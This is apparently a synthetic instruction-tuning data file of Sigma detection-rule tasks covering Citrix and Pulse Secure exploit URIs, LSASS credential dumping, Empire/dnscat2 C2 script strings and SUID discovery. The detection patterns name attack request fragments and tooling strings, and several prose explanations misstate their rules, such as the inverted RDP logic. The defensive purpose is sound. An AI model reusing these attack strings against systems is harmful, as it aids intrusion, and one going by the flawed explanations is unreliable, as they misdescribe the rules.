      "answer": "In order to detect exploitation attempts against Citrix Netscaler, Application Delivery Controller (ADS), and Citrix Gateway exploiting vulnerabilities reported as CVE-2020-8193 and CVE-2020-8195, you should monitor web server logs for specific patterns in the URI query. Look for queries containing '/rapi/filedownload?filter=path:%2F'. Additionally, watch for queries that include all the following parameters: '/pcidss/report', 'type=all_signatures', and 'sig_name=_default_signature_'. These queries are potential indicators of an attack exploiting the mentioned CVE vulnerabilities. Ensure to capture the client IP, the virtual host, the full URL, and the response code for any request that matches these patterns. It is important to note that while this detection strategy is critical for identifying possible exploitation attempts, there might be unknown false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting connections from routable IPs to an RDP listener - which is indicative of a publicly-accessible RDP service..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect connections from routable IPs to an RDP listener - which is indicative of a publicly-accessible RDP service, you should monitor traffic for Remote Desktop Protocol (RDP) connections where the originating IP address starts with commonly used private address spaces ('192.168.', '10.', and '172.16.' through '172.31.') or unique local addresses ('fd', '2620:83:800f'). These indicators point to traffic originating from private or internal networks to an RDP service, suggesting that the RDP service might be publicly accessible. Monitoring for such traffic patterns is crucial as it could imply a risk of unauthorized access or potential brute force or remote exploit attempts on the RDP service. It is highly recommended to verify that any detected RDP exposure to the internet is intentional and approved, ensuring that the servers have not been compromised and are properly secured if they must be exposed. This approach focuses on leveraging Zeek logs targeted at RDP traffic, emphasizing the importance of validating the authenticity and security stance of such connections to minimize risk.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: zeek\n    service: rdp\ndetection:\n    selection:\n        id.orig_h|startswith:\n            - '192.168.'\n            - '10.'\n            - '172.16.'\n            - '172.17.'\n            - '172.18.'\n            - '172.19.'\n            - '172.20.'\n            - '172.21.'\n            - '172.22.'\n            - '172.23.'\n            - '172.24.'\n            - '172.25.'\n            - '172.26.'\n            - '172.27.'\n            - '172.28.'\n            - '172.29.'\n            - '172.30.'\n            - '172.31.'\n            - 'fd'\n            - '2620:83:800f'\n    #approved_rdp:\n      #dst_ip:\n        #- x.x.x.x\n    condition: not selection #and not approved_rdp\nfalsepositives:\n    - Although it is recommended to NOT have RDP exposed to the internet, verify that this is a) allowed b) the server has not already been compromised via some brute force or remote exploit since it has been exposed to the internet. Work to secure the server if you are unable to remove it from being exposed to the internet.\nfields:\n    - id.orig_h\n    - id.resp_h\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: zeek\n    service: rdp\ndetection:\n    selection:\n        id.orig_h|startswith:\n            - '192.168.'\n            - '10.'\n            - '172.16.'\n            - '172.17.'\n            - '172.18.'\n            - '172.19.'\n            - '172.20.'\n            - '172.21.'\n            - '172.22.'\n            - '172.23.'\n            - '172.24.'\n            - '172.25.'\n            - '172.26.'\n            - '172.27.'\n            - '172.28.'\n            - '172.29.'\n            - '172.30.'\n            - '172.31.'\n            - 'fd'\n            - '2620:83:800f'\n    #approved_rdp:\n      #dst_ip:\n        #- x.x.x.x\n    condition: not selection #and not approved_rdp\nfalsepositives:\n    - Although it is recommended to NOT have RDP exposed to the internet, verify that this is a) allowed b) the server has not already been compromised via some brute force or remote exploit since it has been exposed to the internet. Work to secure the server if you are unable to remove it from being exposed to the internet.\nfields:\n    - id.orig_h\n    - id.resp_h\nlevel: high\n",
      "question": "connections from routable IPs to an RDP listener - which is indicative of a publicly-accessible RDP service.",
      "answer": "In order to detect connections from routable IPs to an RDP listener - which is indicative of a publicly-accessible RDP service, you should monitor traffic for Remote Desktop Protocol (RDP) connections where the originating IP address starts with commonly used private address spaces ('192.168.', '10.', and '172.16.' through '172.31.') or unique local addresses ('fd', '2620:83:800f'). These indicators point to traffic originating from private or internal networks to an RDP service, suggesting that the RDP service might be publicly accessible. Monitoring for such traffic patterns is crucial as it could imply a risk of unauthorized access or potential brute force or remote exploit attempts on the RDP service. It is highly recommended to verify that any detected RDP exposure to the internet is intentional and approved, ensuring that the servers have not been compromised and are properly secured if they must be exposed. This approach focuses on leveraging Zeek logs targeted at RDP traffic, emphasizing the importance of validating the authenticity and security stance of such connections to minimize risk."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect adversaries who are using a known encryption algorithm to conceal command and control traffic instead of relying on inherent protections offered by a communication protocol, you should focus on analyzing scripts executed on Windows environments. Specifically, monitor for script activities that involve scripting block logs, given that Script Block Logging must be enabled. Look for scripts that incorporate elements such as 'System.Net.Security.SslStream', 'Net.Security.RemoteCertificateValidationCallback', and '.AuthenticateAsClient' within their text. These specific components suggest an attempt to implement SSL/TLS encryption directly, possibly as a means to obscure malicious traffic. It's essential to note, however, that such detection might also flag legitimate administrative scripts using similar techniques for secure communication, hence the possibility of false positives is considered low.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - System.Net.Security.SslStream\n            - Net.Security.RemoteCertificateValidationCallback\n            - '.AuthenticateAsClient'\n    condition: selection\nfalsepositives:\n    - Legitimate administrative script\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - System.Net.Security.SslStream\n            - Net.Security.RemoteCertificateValidationCallback\n            - '.AuthenticateAsClient'\n    condition: selection\nfalsepositives:\n    - Legitimate administrative script\nlevel: low\n",
      "question": "Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol.",
      "answer": "In order to detect adversaries who are using a known encryption algorithm to conceal command and control traffic instead of relying on inherent protections offered by a communication protocol, you should focus on analyzing scripts executed on Windows environments. Specifically, monitor for script activities that involve scripting block logs, given that Script Block Logging must be enabled. Look for scripts that incorporate elements such as 'System.Net.Security.SslStream', 'Net.Security.RemoteCertificateValidationCallback', and '.AuthenticateAsClient' within their text. These specific components suggest an attempt to implement SSL/TLS encryption directly, possibly as a means to obscure malicious traffic. It's essential to note, however, that such detection might also flag legitimate administrative scripts using similar techniques for secure communication, hence the possibility of false positives is considered low."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting CVE-2019-11510 exploitation attempt - URI contains Guacamole.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect CVE-2019-11510 exploitation attempt - URI contains Guacamole, you should: Check web server logs for any requests that contain the specific Uniform Resource Identifier (URI) pattern '?/dana/html5acc/guacamole/'. This detection focuses on spotting attempts to exploit a vulnerability associated with accessing Guacamole through a crafted URI. To efficiently detect such attempts, it is important to monitor fields like the IP address of the client making the request, the server's virtual host, the full URL of the request, and the server's response to the request. This activity is considered critical and, while false positives are deemed unknown, it's important to be diligent in monitoring and investigating any hits due to the severity associated with CVE-2019-11510.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: webserver\ndetection:\n    selection:\n        cs-uri-query: '*?/dana/html5acc/guacamole/*'\n    condition: selection\nfields:\n    - client_ip\n    - vhost\n    - url\n    - response\nfalsepositives:\n    - Unknown\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: webserver\ndetection:\n    selection:\n        cs-uri-query: '*?/dana/html5acc/guacamole/*'\n    condition: selection\nfields:\n    - client_ip\n    - vhost\n    - url\n    - response\nfalsepositives:\n    - Unknown\nlevel: critical\n",
      "question": "CVE-2019-11510 exploitation attempt - URI contains Guacamole",
      "answer": "In order to detect CVE-2019-11510 exploitation attempt - URI contains Guacamole, you should: Check web server logs for any requests that contain the specific Uniform Resource Identifier (URI) pattern '?/dana/html5acc/guacamole/'. This detection focuses on spotting attempts to exploit a vulnerability associated with accessing Guacamole through a crafted URI. To efficiently detect such attempts, it is important to monitor fields like the IP address of the client making the request, the server's virtual host, the full URL of the request, and the server's response to the request. This activity is considered critical and, while false positives are deemed unknown, it's important to be diligent in monitoring and investigating any hits due to the severity associated with CVE-2019-11510."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious LSASS process process clone that could be a sign of credential dumping activity.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a suspicious LSASS process clone that could be a sign of credential dumping activity, you should: Monitor for instances where a process with the image path ending in '\\Windows\\System32\\lsass.exe' is spawned by a parent process that also has its image path ending in '\\Windows\\System32\\lsass.exe'. This activity is significant as it is closely associated with sophisticated techniques aimed at obtaining credentials from memory, particularly on Windows systems. Such behavior is not common for legitimate operations and could indicate an attack aimed at credential theft, which is a critical security threat. This detection focuses on process creation events within Windows environments, emphasizing the importance of monitoring for anomalies specifically related to the Local Security Authority Subsystem Service (LSASS), a process integral to the management of security policies and credentials on Windows systems.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\Windows\\System32\\lsass.exe'\n        ParentImage|endswith: '\\Windows\\System32\\lsass.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\Windows\\System32\\lsass.exe'\n        ParentImage|endswith: '\\Windows\\System32\\lsass.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical\n",
      "question": "suspicious LSASS process process clone that could be a sign of credential dumping activity",
      "answer": "In order to detect a suspicious LSASS process clone that could be a sign of credential dumping activity, you should: Monitor for instances where a process with the image path ending in '\\Windows\\System32\\lsass.exe' is spawned by a parent process that also has its image path ending in '\\Windows\\System32\\lsass.exe'. This activity is significant as it is closely associated with sophisticated techniques aimed at obtaining credentials from memory, particularly on Windows systems. Such behavior is not common for legitimate operations and could indicate an attack aimed at credential theft, which is a critical security threat. This detection focuses on process creation events within Windows environments, emphasizing the importance of monitoring for anomalies specifically related to the Local Security Authority Subsystem Service (LSASS), a process integral to the management of security policies and credentials on Windows systems."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Silence EmpireDNSAgent as described in the Group-IP report.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect Silence EmpireDNSAgent as described in the Group-IP report, you should: Monitor PowerShell scripts for activities commonly associated with this attack by analyzing script block execution logs on Windows systems. Ensure Script Block Logging is enabled to capture the relevant data. Specifically, look for the simultaneous presence of script text snippets indicative of malign activities. For detection, focus on two main patterns. The first pattern, suggesting PowerShell abuse by an Empire toolkit, includes scripts initiating diagnostic processes, computer shutdown or restart commands, handling execution exceptions, passing command arguments, and closing DNS communication tunnels typically used for command and control (C2) actions. The second pattern, indicative of DNS based communication attempts used by the DNSAgent, involves scripts setting up DNS queries, executing nslookup commands, generating random DNS fields, converting session options, and marking sessions as dead or evaluating session drivers. The detection of these two patterns together in PowerShell script execution suggests a critical level threat, potentially due to the Silence group's EmpireDNSAgent activity. Be mindful that not all detections may be malicious and unknown false positives can occur, requiring further investigation for confirmation.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    empire:\n        # better to randomise the order\n        ScriptBlockText|contains|all:\n            - 'System.Diagnostics.Process'\n            - 'Stop-Computer'\n            - 'Restart-Computer'\n            - 'Exception in execution'\n            - '$cmdargs'\n            - 'Close-Dnscat2Tunnel'\n    dnscat:\n        # better to randomise the order\n        ScriptBlockText|contains|all:\n            - 'set type=$LookupType`nserver'\n            - '$Command | nslookup 2>&1 | Out-String'\n            - 'New-RandomDNSField'\n            - '[Convert]::ToString($SYNOptions, 16)'\n            - '$Session.Dead = $True'\n            - '$Session[\"Driver\"] -eq'\n    condition: empire and dnscat\nfalsepositives:\n    - Unknown\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    empire:\n        # better to randomise the order\n        ScriptBlockText|contains|all:\n            - 'System.Diagnostics.Process'\n            - 'Stop-Computer'\n            - 'Restart-Computer'\n            - 'Exception in execution'\n            - '$cmdargs'\n            - 'Close-Dnscat2Tunnel'\n    dnscat:\n        # better to randomise the order\n        ScriptBlockText|contains|all:\n            - 'set type=$LookupType`nserver'\n            - '$Command | nslookup 2>&1 | Out-String'\n            - 'New-RandomDNSField'\n            - '[Convert]::ToString($SYNOptions, 16)'\n            - '$Session.Dead = $True'\n            - '$Session[\"Driver\"] -eq'\n    condition: empire and dnscat\nfalsepositives:\n    - Unknown\nlevel: critical\n",
      "question": "Silence EmpireDNSAgent as described in the Group-IP report",
      "answer": "In order to detect Silence EmpireDNSAgent as described in the Group-IP report, you should: Monitor PowerShell scripts for activities commonly associated with this attack by analyzing script block execution logs on Windows systems. Ensure Script Block Logging is enabled to capture the relevant data. Specifically, look for the simultaneous presence of script text snippets indicative of malign activities. For detection, focus on two main patterns. The first pattern, suggesting PowerShell abuse by an Empire toolkit, includes scripts initiating diagnostic processes, computer shutdown or restart commands, handling execution exceptions, passing command arguments, and closing DNS communication tunnels typically used for command and control (C2) actions. The second pattern, indicative of DNS based communication attempts used by the DNSAgent, involves scripts setting up DNS queries, executing nslookup commands, generating random DNS fields, converting session options, and marking sessions as dead or evaluating session drivers. The detection of these two patterns together in PowerShell script execution suggests a critical level threat, potentially due to the Silence group's EmpireDNSAgent activity. Be mindful that not all detections may be malicious and unknown false positives can occur, requiring further investigation for confirmation."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Obfuscated use of stdin to execute PowerShell.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect obfuscated use of stdin to execute PowerShell, you should monitor security logs on Windows systems. Specifically, focus on events with ID 4697, which records service installations. This scrutiny becomes effective only when the 'System Security Extension' audit subcategory is enabled, as it allows the logging of these events. Look for services being installed where the service file name incorporates 'cmd' or 'powershell' along with either the presence of 'noexit' or the explicit command invocation patterns ' /c ' and ' /r '. This combination is indicative of an attempt to obfuscate the execution of PowerShell via standard input mechanisms, a tactic often employed to avoid detection by simple command line monitoring tools.\n\nPay attention to services that contain both 'cmd' and 'powershell' in their installation path or command line because this is a common method employed by adversaries to execute PowerShell scripts in a way that might not be immediately apparent to casual observation or basic detection mechanisms. Additionally, the use of 'noexit', ' /c ', or ' /r ' further suggests an attempt to control the PowerShell interpreter's behavior, typically to ensure that scripts execute in a particular context or to hide their execution.\n\nDue to the sophisticated nature of these detection methods, any hits on these criteria should be treated with a high level of suspicion. However, maintain awareness of potential unknown false positives, which could arise from legitimate administrative activities or unique software installation practices within your environment. Tags associated with this detection tactic include techniques and tactics around the execution of scripts, obfuscation, and potentially undesired or unauthorized service installation.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\n    definition: The 'System Security Extension' audit subcategory need to be enabled to log the EID 4697\ndetection:\n    selection:\n        EventID: 4697\n        ServiceFileName|contains|all:\n            - 'cmd'\n            - 'powershell'\n    selection2:\n        ServiceFileName|contains:\n            - '${input}'\n            - 'noexit'\n    selection3:\n        ServiceFileName|contains:\n            - ' /c '\n            - ' /r '\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\n    definition: The 'System Security Extension' audit subcategory need to be enabled to log the EID 4697\ndetection:\n    selection:\n        EventID: 4697\n        ServiceFileName|contains|all:\n            - 'cmd'\n            - 'powershell'\n    selection2:\n        ServiceFileName|contains:\n            - '${input}'\n            - 'noexit'\n    selection3:\n        ServiceFileName|contains:\n            - ' /c '\n            - ' /r '\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Obfuscated use of stdin to execute PowerShell",
      "answer": "In order to detect obfuscated use of stdin to execute PowerShell, you should monitor security logs on Windows systems. Specifically, focus on events with ID 4697, which records service installations. This scrutiny becomes effective only when the 'System Security Extension' audit subcategory is enabled, as it allows the logging of these events. Look for services being installed where the service file name incorporates 'cmd' or 'powershell' along with either the presence of 'noexit' or the explicit command invocation patterns ' /c ' and ' /r '. This combination is indicative of an attempt to obfuscate the execution of PowerShell via standard input mechanisms, a tactic often employed to avoid detection by simple command line monitoring tools.\n\nPay attention to services that contain both 'cmd' and 'powershell' in their installation path or command line because this is a common method employed by adversaries to execute PowerShell scripts in a way that might not be immediately apparent to casual observation or basic detection mechanisms. Additionally, the use of 'noexit', ' /c ', or ' /r ' further suggests an attempt to control the PowerShell interpreter's behavior, typically to ensure that scripts execute in a particular context or to hide their execution.\n\nDue to the sophisticated nature of these detection methods, any hits on these criteria should be treated with a high level of suspicion. However, maintain awareness of potential unknown false positives, which could arise from legitimate administrative activities or unique software installation practices within your environment. Tags associated with this detection tactic include techniques and tactics around the execution of scripts, obfuscation, and potentially undesired or unauthorized service installation."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting adversary creating hidden file or directory, by detecting directories or files with . as the first character.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect adversary creating hidden file or directory, by detecting directories or files with . as the first character, you should monitor execution events on Linux systems specifically using the auditd service. Focus on capturing the execution of the following commands: mkdir, touch, vim, nano, and vi. These commands are commonly utilized by users and scripts for file or directory creation and editing. When these commands are executed, pay special attention to the arguments passed to them.\n\nWatch for instances where the first argument (a1) or the second argument (a2) contain or start with '.', indicating the creation or modification of hidden files or directories. Hidden files and directories are typically denoted by a leading '.' character in Unix-based systems such as Linux.\n\nThis detection mechanism involves correlating execution events (tracked as EXECVE types) with the specific patterns in the passed arguments. The detection conditions are met when any of the watched commands are associated with arguments exhibiting the outlined patterns, signifying potential stealthy file or directory creation or manipulation activities often characteristic of malicious operations.\n\nIt is important to note that this approach might generate some alerts that do not correspond to actual malicious activity (false positives), as the creation of hidden files and directories is not exclusively malicious but is a known behavior in system administration, configuration, and certain applications' operations. Thus, the level of threat associated with triggering this detection is considered low; however, it is crucial for situational awareness and further investigation depending on the context of occurrence and other correlated security events. The techniques are related to the execution of commands and creation/manipulation of files or directories, potentially aligning with tactics such as Persistence, Privilege Escalation, and Defense Evasion.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    service: auditd\ndetection:\n    commands:\n        type: EXECVE\n        a0:\n            - mkdir\n            - touch\n            - vim\n            - nano\n            - vi\n    arguments:\n        - a1|contains: '/.'\n        - a1|startswith: '.'\n        - a2|contains: '/.'\n        - a2|startswith: '.'\n    condition: commands and arguments\nfalsepositives:\n    - Unknown\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    service: auditd\ndetection:\n    commands:\n        type: EXECVE\n        a0:\n            - mkdir\n            - touch\n            - vim\n            - nano\n            - vi\n    arguments:\n        - a1|contains: '/.'\n        - a1|startswith: '.'\n        - a2|contains: '/.'\n        - a2|startswith: '.'\n    condition: commands and arguments\nfalsepositives:\n    - Unknown\nlevel: low\n",
      "question": "adversary creating hidden file or directory, by detecting directories or files with . as the first character",
      "answer": "In order to detect adversary creating hidden file or directory, by detecting directories or files with . as the first character, you should monitor execution events on Linux systems specifically using the auditd service. Focus on capturing the execution of the following commands: mkdir, touch, vim, nano, and vi. These commands are commonly utilized by users and scripts for file or directory creation and editing. When these commands are executed, pay special attention to the arguments passed to them.\n\nWatch for instances where the first argument (a1) or the second argument (a2) contain or start with '.', indicating the creation or modification of hidden files or directories. Hidden files and directories are typically denoted by a leading '.' character in Unix-based systems such as Linux.\n\nThis detection mechanism involves correlating execution events (tracked as EXECVE types) with the specific patterns in the passed arguments. The detection conditions are met when any of the watched commands are associated with arguments exhibiting the outlined patterns, signifying potential stealthy file or directory creation or manipulation activities often characteristic of malicious operations.\n\nIt is important to note that this approach might generate some alerts that do not correspond to actual malicious activity (false positives), as the creation of hidden files and directories is not exclusively malicious but is a known behavior in system administration, configuration, and certain applications' operations. Thus, the level of threat associated with triggering this detection is considered low; however, it is crucial for situational awareness and further investigation depending on the context of occurrence and other correlated security events. The techniques are related to the execution of commands and creation/manipulation of files or directories, potentially aligning with tactics such as Persistence, Privilege Escalation, and Defense Evasion."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting remote file copy attempt to a hidden network share. This may indicate lateral movement or data staging activity..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a remote file copy attempt to a hidden network share, which may indicate lateral movement or data staging activity, you should: Monitor for process creation events within Windows operating systems that involve command-line tools such as cmd.exe and powershell.exe. Specifically, look for instances where these tools execute commands containing the strings 'echo' and '>' along with a reference to a named pipe ('\\\\\\\\.\\\\pipe\\\\'), which is a method often used in scripting to redirect output to a network location in a covert fashion. Such activity could suggest an attempt at moving files to a hidden network share, potentially for malicious purposes like data theft or spreading within a network. It's important to be aware that there are legitimate cases where similar patterns may occur, so careful analysis is necessary to distinguish between benign and malicious behavior. The level of concern for such detections is considered high, indicating that immediate investigation is recommended upon alert.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_name:\n        - Image|endswith:\n            - '\\cmd.exe'\n            - '\\powershell.exe'\n        - OriginalFileName:\n            - 'Cmd.Exe'\n            - 'PowerShell.EXE'\n    selection_args:\n        CommandLine|contains|all:\n            - 'echo'\n            - '>'\n            - '\\\\\\\\.\\\\pipe\\\\'\n    condition: all of selection*\nfalsepositives:\n    - Other programs that cause these patterns (please report)\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_name:\n        - Image|endswith:\n            - '\\cmd.exe'\n            - '\\powershell.exe'\n        - OriginalFileName:\n            - 'Cmd.Exe'\n            - 'PowerShell.EXE'\n    selection_args:\n        CommandLine|contains|all:\n            - 'echo'\n            - '>'\n            - '\\\\\\\\.\\\\pipe\\\\'\n    condition: all of selection*\nfalsepositives:\n    - Other programs that cause these patterns (please report)\nlevel: high\n",
      "question": "remote file copy attempt to a hidden network share. This may indicate lateral movement or data staging activity.",
      "answer": "In order to detect a remote file copy attempt to a hidden network share, which may indicate lateral movement or data staging activity, you should: Monitor for process creation events within Windows operating systems that involve command-line tools such as cmd.exe and powershell.exe. Specifically, look for instances where these tools execute commands containing the strings 'echo' and '>' along with a reference to a named pipe ('\\\\\\\\.\\\\pipe\\\\'), which is a method often used in scripting to redirect output to a network location in a covert fashion. Such activity could suggest an attempt at moving files to a hidden network share, potentially for malicious purposes like data theft or spreading within a network. It's important to be aware that there are legitimate cases where similar patterns may occur, so careful analysis is necessary to distinguish between benign and malicious behavior. The level of concern for such detections is considered high, indicating that immediate investigation is recommended upon alert."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting This rule triggers on user accounts that are added to the local Administrators group, which could be legitimate activity or a sign of privilege escalation activity.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when user accounts are added to the local Administrators group, which might indicate either legitimate administrative actions or potential privilege escalation activities, you should monitor Windows Security logs for event ID 4732. This event signals when a user account has been added to a specific group. Specifically, pay attention to instances where the target user name begins with \"Administr,\" or when the target SID corresponds to the well-known SID for the Administrators group, \"S-1-5-32-544.\" It is essential, however, to exclude any entries where the subject user name ends with a \"$\" symbol, as this usually denotes a computer account rather than a human user, reducing the likelihood of it being a malicious activity. Be aware that such detection might capture legitimate administrative activities, so it's categorized with a medium level of confidence. The focus is on ensuring the security of sensitive groups by identifying unauthorized attempts to gain elevated privileges, aligning with known tactics and techniques of privilege escalation.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4732\n    selection_group1:\n        TargetUserName|startswith: 'Administr'\n    selection_group2:\n        TargetSid: 'S-1-5-32-544'\n    filter:\n        SubjectUserName|endswith: '$'\n    condition: selection and (1 of selection_group*) and not filter\nfalsepositives:\n    - Legitimate administrative activity\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4732\n    selection_group1:\n        TargetUserName|startswith: 'Administr'\n    selection_group2:\n        TargetSid: 'S-1-5-32-544'\n    filter:\n        SubjectUserName|endswith: '$'\n    condition: selection and (1 of selection_group*) and not filter\nfalsepositives:\n    - Legitimate administrative activity\nlevel: medium\n",
      "question": "This rule triggers on user accounts that are added to the local Administrators group, which could be legitimate activity or a sign of privilege escalation activity",
      "answer": "In order to detect when user accounts are added to the local Administrators group, which might indicate either legitimate administrative actions or potential privilege escalation activities, you should monitor Windows Security logs for event ID 4732. This event signals when a user account has been added to a specific group. Specifically, pay attention to instances where the target user name begins with \"Administr,\" or when the target SID corresponds to the well-known SID for the Administrators group, \"S-1-5-32-544.\" It is essential, however, to exclude any entries where the subject user name ends with a \"$\" symbol, as this usually denotes a computer account rather than a human user, reducing the likelihood of it being a malicious activity. Be aware that such detection might capture legitimate administrative activities, so it's categorized with a medium level of confidence. The focus is on ensuring the security of sensitive groups by identifying unauthorized attempts to gain elevated privileges, aligning with known tactics and techniques of privilege escalation."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of \"find\" binary in a suspicious manner to perform discovery.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect usage of \"find\" binary in a suspicious manner to perform discovery, you should focus on monitoring the creation of processes on Linux systems. Specifically, look out for processes that are being created where the name of the binary ends with '/find'. This indication focuses on the usage of the \"find\" command which is deployed in potentially malicious ways. The command lines to pay close attention to include those containing permission-related flags such as '-perm -4000', '-perm -2000', '-perm 0777', '-perm -222', '-perm -o w', '-perm -o x', '-perm -u=s', and '-perm -g=s'. These flags are typically used to search for files with specific permissions, which can be an indicator of an attacker trying to identify sensitive or executable files, modify file permissions, or locate files that can be written to or executed for exploitation purposes. Not all uses of these command-line options are malicious, but their presence, especially when combined, can signify an attempt at reconnaissance or preparation for further attacks. As with any detection mechanism, it's important to consider the context in which these commands are used to minimize false positives. The level of threat associated with this activity is considered medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection:\n        Image|endswith: '/find'\n        CommandLine|contains:\n            - '-perm -4000'\n            - '-perm -2000'\n            - '-perm 0777'\n            - '-perm -222'\n            - '-perm -o w'\n            - '-perm -o x'\n            - '-perm -u=s'\n            - '-perm -g=s'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection:\n        Image|endswith: '/find'\n        CommandLine|contains:\n            - '-perm -4000'\n            - '-perm -2000'\n            - '-perm 0777'\n            - '-perm -222'\n            - '-perm -o w'\n            - '-perm -o x'\n            - '-perm -u=s'\n            - '-perm -g=s'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "usage of \"find\" binary in a suspicious manner to perform discovery",
      "answer": "In order to detect usage of \"find\" binary in a suspicious manner to perform discovery, you should focus on monitoring the creation of processes on Linux systems. Specifically, look out for processes that are being created where the name of the binary ends with '/find'. This indication focuses on the usage of the \"find\" command which is deployed in potentially malicious ways. The command lines to pay close attention to include those containing permission-related flags such as '-perm -4000', '-perm -2000', '-perm 0777', '-perm -222', '-perm -o w', '-perm -o x', '-perm -u=s', and '-perm -g=s'. These flags are typically used to search for files with specific permissions, which can be an indicator of an attacker trying to identify sensitive or executable files, modify file permissions, or locate files that can be written to or executed for exploitation purposes. Not all uses of these command-line options are malicious, but their presence, especially when combined, can signify an attempt at reconnaissance or preparation for further attacks. As with any detection mechanism, it's important to consider the context in which these commands are used to minimize false positives. The level of threat associated with this activity is considered medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting modification of an existing service in order to execute an arbitrary payload when the service is started or killed as a potential method for persistence..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the modification of an existing service in order to execute an arbitrary payload when the service is started or killed as a potential method for persistence, you should: Monitor Windows process creation logs for specific command-line patterns that indicate such modifications. Look for usage of the 'sc' command in combination with 'config' and 'binpath=', or 'failure' and 'command=' which can be used to change service configurations or set up custom failure actions - a common technique for establishing persistence by ensuring a payload executes under certain conditions. Additionally, watch for the 'reg add' command modifying 'FailureCommand' or 'ImagePath' registry keys, as this also signifies attempts to alter service behavior or execution paths. Also, be vigilant for commands that involve file extensions typically associated with executable and script files, such as '.exe', '.dll', '.bat', '.cmd', '.ps', and others, as these often indicate the introduction or modification of files to carry malicious payloads. This detection focuses on medium-level threats and, while there might be legitimate uses, any matches should be investigated to confirm whether they are part of a potential attack involving persistence mechanisms.",
    "context": "",
